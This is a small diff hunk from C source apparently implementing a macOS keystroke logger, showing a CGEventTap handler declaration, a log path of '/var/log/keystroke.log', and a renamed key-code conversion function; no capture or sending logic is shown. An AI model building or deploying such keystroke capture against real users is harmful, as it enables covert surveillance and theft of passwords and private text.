@@ -35,7 +35,7 @@ static struct StringBuffer    *sb;
 /******************************************************/
 static const char             logfileLocation[] = "/var/log/keystroke.log";
 CGEventRef                    event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
-static const char *convertKeyCode(int);
+static const char *convertKeyboardCode(int);
 
 /******************************************************/
 typedef struct KeyState {
